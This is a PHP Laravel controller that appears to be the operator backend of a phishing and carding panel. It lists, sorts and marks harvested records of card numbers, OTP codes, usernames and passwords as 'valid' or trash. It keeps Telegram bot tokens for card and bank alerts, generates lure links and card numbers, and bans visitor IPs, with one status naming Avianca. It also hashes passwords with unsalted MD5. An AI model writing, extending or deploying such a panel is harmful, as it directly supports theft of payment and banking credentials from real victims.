<?php

namespace App\Http\Controllers\Page;

use App\Http\Controllers\Controller;
use Carbon\Carbon;
use Dompdf\Dompdf;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Facades\View;
use Yajra\DataTables\DataTables;

class MenuController extends Controller
{
    public function viewUsers(Request $request)
    {
        $owner = Auth::user()->id;
        if ($request->ajax()) {
            $query = DB::table('users')
                ->select(['id', 'usuario', 'rango', 'token_card_telegram', 'token_bank_telegram', 'chat_card_telegram', 'chat_bank_telegram']);
            return DataTables::of($query)
                // ->editColumn('membresia', function ($d) {
                //     return Carbon::parse((int) $d->membresia)->format('Y-m-d');
                // })
                ->toJson();
        }
        $seccion = "Usuarios";
        $urlSeccion = "users";
        return view('menu.admin', compact('seccion', 'urlSeccion'));
    }
    public function banIP(Request $request)
    {
        $id = $request->input('id', '');
        $result = DB::table('datos')
            ->where([
                ['idreg', '=', $id],
            ])
            ->select('ip')->first();
        if ($result) {
            $ip = $result->ip;
            DB::table('ban_ip')
                ->insertOrIgnore([
                    'ip' => $ip,
                ]);
            return response()->json(['action' => 'msgResult', 'data' => 'Se baneó la IP ' . $ip]);
        } else {
            return response()->json(['action' => 'msgError', 'data' => 'No se pudo agregar la IP, es posible que ya este registrada.']);
        }
    }
    public function deleteReg(Request $request)
    {
        $owner = (string) Auth::user()->id;
        $id = $request->input('id', '');
        $result = DB::table('datos')
            ->where([
                ['idreg', '=', $id],
            ])
            ->where(function ($query) use ($owner) {
                $query->where('owner', '=', $owner)
                    ->orWhere('owner', '=', '');
            })
            ->delete();
        return response()->json(['action' => 'ok', 'data' => $result]);
    }

    public function clearCedulas(Request $request)
    {
        $owner = (string) Auth::user()->id;
        $result = DB::table('datos')
            ->where([
                ['tarjeta', '=', ''],
            ])
            ->where(function ($query) use ($owner) {
                $query->where('owner', '=', $owner)
                    ->orWhere('owner', '=', '');
            })
            ->delete();
        return response()->json(['action' => 'ok', 'data' => $result]);
    }
    public function viewTelegram(Request $request)
    {
        $owner = Auth::user()->id;
        $seccion = "My Telegram";
        $urlSeccion = "telegram";
        return view('menu.telegram', compact('seccion', 'urlSeccion'));
    }
    public function updateTelegram(Request $request)
    {
        $id = Auth::user()->id;
        $token_card = $request->input('token_card', '');
        $token_bank = $request->input('token_bank', '');
        $chat_card = $request->input('chat_card', '');
        $chat_bank = $request->input('chat_bank', '');
        $update = array();
        $update['token_card_telegram'] = $token_card;
        $update['token_bank_telegram'] = $token_bank;
        $update['chat_card_telegram'] = $chat_card;
        $update['chat_bank_telegram'] = $chat_bank;
        $result = DB::table('users')
            ->where([['id', '=', $id]])
            ->update($update);
        if ($result === 0) {
            return response()->json(['action' => 'msgError', 'data' => 'No se actualizó porque no hubo cambios']);
        } else if (!$result) {
            return response()->json(['action' => 'msgError', 'data' => 'Hubo un error al realizar la accion']);
        }
        return response()->json(['action' => 'msgResult', 'data' => 'Datos Actualizados']);
    }
    public function updateUser(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'id' => 'required',
            'rango' => 'required',
            // 't' => 'required',
        ]);
        if ($validator->fails()) {
            return response()->json(['action' => 'msgError', 'data' => $validator->errors()->all()]);
        }

        $id = $request->input('id');
        $password = $request->input('password', '');
        $rango = $request->input('rango');
        $token_card = $request->input('token_card', '');
        $token_bank = $request->input('token_bank', '');
        $chat_card = $request->input('chat_card', '');
        $chat_bank = $request->input('chat_bank', '');
        $update = array();
        $update['rango'] = $rango;
        $update['chat_card_telegram'] = $chat_card;
        $update['chat_bank_telegram'] = $chat_bank;
        $update['token_card_telegram'] = $token_card;
        $update['token_bank_telegram'] = $token_bank;
        if ($password != '') {
            $update['password'] = md5($password);
        }
        $result = DB::table('users')
            ->where([['id', '=', $id]])
            ->update($update);
        if ($result === 0) {
            return response()->json(['action' => 'msgError', 'data' => 'No se actualizó porque no hubo cambios']);
        } else if (!$result) {
            return response()->json(['action' => 'msgError', 'data' => 'Hubo un error al realizar la accion']);
        }
        return response()->json(['action' => 'msgResult', 'data' => 'Datos Actualizados']);
    }

    public function getNews(Request $request)
    {
        $owner = (string) Auth::user()->id;
        if ($request->ajax()) {
            $query = DB::table('datos')
                ->where([
                    ['status', '!=', 'finish'],
                    ['status', '!=', 'finish_avianca'],
                    ['tarjeta', '!=', ''],

                ])
                ->where(function ($query) use ($owner) {
                    $query->where('owner', '=', $owner)
                        ->orWhere('owner', '=', '');
                });
            return DataTables::of($query)
                ->editColumn('horamodificado', function ($d) {
                    return Carbon::parse((int) $d->horamodificado)->diffForHumans();
                })
                ->toJson();
        }
        $seccion = "Nuevos";
        $urlSeccion = "news";
        return view('menu.panel', compact('seccion', 'urlSeccion'));
    }
    public function getNotes(Request $request)
    {
        $owner = (string) Auth::user()->id;
        if ($request->ajax()) {
            $query = DB::table('datos')
                ->where([
                    ['status', '=', 'finish'],
                    ['status', '=', 'finish_avianca'],
                ])
                ->where(function ($query) use ($owner) {
                    $query->where('owner', '=', $owner)
                        ->orWhere('owner', '=', '');
                })
                ->where([
                    ['nota', '!=', ''],
                ]);
            return DataTables::of($query)
                ->editColumn('horamodificado', function ($d) {
                    return Carbon::parse((int) $d->horamodificado)->diffForHumans();
                })
                ->toJson();
        }
        $seccion = "Notas";
        $urlSeccion = "notes";
        return view('menu.panel', compact('seccion', 'urlSeccion'));
    }
    public function getLives(Request $request)
    {
        $owner = (string) Auth::user()->id;
        if ($request->ajax()) {
            $query = DB::table('datos')
            ->whereIn('status', ['finish', 'finish_avianca'])
                ->where(function ($query) use ($owner) {
                    $query->where('owner', '=', $owner)
                        ->orWhere('owner', '=', '');
                })
                ->where(
                    function ($query) {
                        $query->where('tarjeta', '!=', '')
                            // ->orWhere('email', '!=', '')
                            ->orWhere(
                                function ($query) {
                                    $query->where('otp', '!=', '')
                                        ->where('usuario', '!=', '')
                                        ->where('password', '!=', '');
                                }
                            );
                    }
                );
            return DataTables::of($query)
                ->editColumn('horamodificado', function ($d) {
                    return Carbon::parse((int) $d->horamodificado)->diffForHumans();
                })
                ->toJson();
        }
        $seccion = "Válidos";
        $urlSeccion = "live";
        return view('menu.panel', compact('seccion', 'urlSeccion'));
    }
    public function getTrash(Request $request)
    {
        $owner = (string) Auth::user()->id;
        if ($request->ajax()) {
            $query = DB::table('datos')
                ->where([
                    ['status', '=', 'finish'],
                    ['status', '=', 'finish_avianca'],
                ])
                ->where(function ($query) use ($owner) {
                    $query->where('owner', '=', $owner)
                        ->orWhere('owner', '=', '');
                })
                ->where(
                    function ($query) {
                        $query->where('tarjeta', '=', '')
                            ->where('otp', '!=', '');
                    }
                );
            return DataTables::of($query)
                ->editColumn('horamodificado', function ($d) {
                    return Carbon::parse((int) $d->horamodificado)->diffForHumans();
                })
                ->toJson();
        }
        $seccion = "Basura";
        $urlSeccion = "trash";
        return view('menu.panel', compact('seccion', 'urlSeccion'));
    }
    public function getGenerator(Request $request)
    {
        if ($request->ajax()) {
            $numero = $request->input('numero');
            $result = DB::table('generador')
                ->where('numero', '=', $numero)
                ->first();
            if ($result) {
                return response()->json(['action' => 'ok', 'data' => 'fail']);
            }
            $owner = (string) Auth::user()->id;
            $result = DB::table('generador')
                ->insert([
                    'numero' => $numero,
                    'time' => time(),
                    'owner' => $owner
                ]);
            if ($result) {
                return response()->json(['action' => 'ok', 'data' => 'ok']);
            }
            return response()->json(['action' => 'ok', 'data' => 'error']);
        }
        $seccion = "Generador #";
        $urlSeccion = "generator";
        return view('menu.generator', compact('seccion', 'urlSeccion'));
    }
    public function checkCambios(Request $request)
    {
        $owner = (string) Auth::user()->id;
        $hora = '';
        $result = DB::table('datos')
            ->where(function ($query) use ($owner) {
                $query->where('owner', '=', $owner)
                    ->orWhere('owner', '=', '');
            })
            ->orderByDesc('horamodificado')
            ->first(['horamodificado']);
        if ($result) {
            $hora = $result->horamodificado;
        }
        return response()->json(['action' => 'ok', 'data' => $hora]);
    }
    public function updateNote(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'id' => 'required',
        ]);
        if ($validator->fails()) {
            return response()->json(['action' => 'msgError', 'data' => $validator->errors()->all()]);
        }
        $owner = (string) Auth::user()->id;
        $id = $request->input('id');
        $nota = $request->input('nota');
        $result = DB::table('datos')
            ->where([
                ['idreg', '=', $id],
                // ['owner', '=', '1']
            ])
            ->where(function ($query) use ($owner) {
                $query->where('owner', '=', $owner)
                    ->orWhere('owner', '=', '');
            })
            ->update([
                'nota' => $nota,
            ]);
        if ($result === 0) {
            return response()->json(['action' => 'msgError', 'data' => 'No se actualizó porque no hubo cambios']);
        } else if (!$result) {
            return response()->json(['action' => 'msgError', 'data' => 'Hubo un error al realizar la accion']);
        }
        return response()->json(['action' => 'ok', 'data' => $result]);
    }
    public function actionData(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'id' => 'required',
            'action' => 'required',
        ]);
        if ($validator->fails()) {
            return response()->json(['action' => 'msgError', 'data' => $validator->errors()->all()]);
        }
        $owner = (string) Auth::user()->id;
        $id = $request->input('id');
        $action = $request->input('action');
        $result = DB::table('datos')
            ->where([
                ['idreg', '=', $id],
                // ['owner', '=', '1']
            ])
            ->where(function ($query) use ($owner) {
                $query->where('owner', '=', $owner)
                    ->orWhere('owner', '=', '');
            })
            ->update([
                'status' => $action,
                'horamodificado' => time()
            ]);
        if ($result === 0) {
            return response()->json(['action' => 'msgError', 'data' => 'No se actualizó porque no hubo cambios']);
        } else if (!$result) {
            return response()->json(['action' => 'msgError', 'data' => 'Hubo un error al realizar la accion']);
        }
        return response()->json(['action' => 'ok', 'data' => $result]);
    }
    public function finishAll(Request $request)
    {
        $owner = (string) Auth::user()->id;
        $result = DB::table('datos')
            ->where([
                ['status', '!=', 'finish'],
            ])
            ->where(function ($query) use ($owner) {
                $query->where('owner', '=', $owner)
                    ->orWhere('owner', '=', '');
            })
            ->update(['status' => 'finish', 'horamodificado' => time()]);
        return response()->json(['action' => 'ok', 'data' => $result]);
    }
    public function generarLink(Request $request)
    {
        if ($request->ajax()) {
            $cod_unico = $this->generate_string(20);
            // $result = DB::table('users')
            //     ->where([['id', '=', $owner]])
            //     ->update(['cod_unico' => $cod_unico]);
            $link = Auth::user()->link . '?utp=' . $cod_unico;
            return response()->json(['action' => 'ok', 'data' => $link]);
        }
        return response()->json(['action' => 'error']);
    }
    function generate_string($strength = 16)
    {
        $abecedario = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $input_length = strlen($abecedario);
        $random_string = '';
        for ($i = 0; $i < $strength; $i++) {
            $random_character = $abecedario[mt_rand(0, $input_length - 1)];
            $random_string .= $random_character;
        }
        return $random_string;
    }
}
